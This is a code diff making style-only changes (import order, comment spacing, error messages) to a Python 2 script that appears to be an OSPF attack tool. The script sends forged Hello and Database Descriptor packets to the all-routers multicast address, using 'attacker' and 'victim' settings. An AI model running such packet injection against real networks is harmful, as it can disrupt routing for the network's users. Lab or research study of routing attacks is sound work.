@@ -1,14 +1,16 @@
-import socket, random
+import random
+import socket
 import struct
 import threading
-
 import time
-import yaml
 from struct import *
+
+import yaml
 
 from network.OSPFSerializer import serialize_ospf_hello_header, serializeOSPFDatabaseHeader
 from packet.OSPFDatabaseDescriptorHeader import OSPFDatabaseDescriptorHeader
 from packet.OSPFHelloHeader import OSPFHelloHeader
+
 
 def send_dd_updates(config, sfd):
     seq_number = random.randint(100, 2000)
@@ -26,18 +28,18 @@ def send_dd_updates(config, sfd):
         # Send initial DB update
         sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                    (config['ospf']['multicast_all_routers'], config['ospf']['port']))
-        dd_update.set_control_initial_bit(False) # no longer the initial packet
-        time.sleep(config['attacker']['wait_between_dd']) # wait before next packet
+        dd_update.set_control_initial_bit(False)  # no longer the initial packet
+        time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
         for i in range(0, config['attacker']['dd_count'], 1):
             sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                        (config['ospf']['multicast_all_routers'], config['ospf']['port']))
             time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
 
-        dd_update.set_control_more_bit(False) # no more packets
+        dd_update.set_control_more_bit(False)  # no more packets
         sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                    (config['ospf']['multicast_all_routers'], config['ospf']['port']))
     except socket.error, msg:
-        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        print 'Socket could not be created. Message: ' + str(msg)
         sys.exit()
 
 def send_hello_packet(config, sfd):
@@ -55,7 +57,7 @@ def send_hello_packet(config, sfd):
                        (config['ospf']['multicast_all_routers'], config['ospf']['port']))
             time.sleep(config['victim']['hello_interval'])
     except socket.error, msg:
-        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        print 'Socket could not be created. Message: ' + str(msg)
         sys.exit()
 
 
@@ -78,7 +80,7 @@ def main():
         send_dd_updates(config, sfd)
 
     except socket.error, msg:
-        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        print 'Socket could not be created. Message: ' + str(msg)
         sys.exit()
 
 
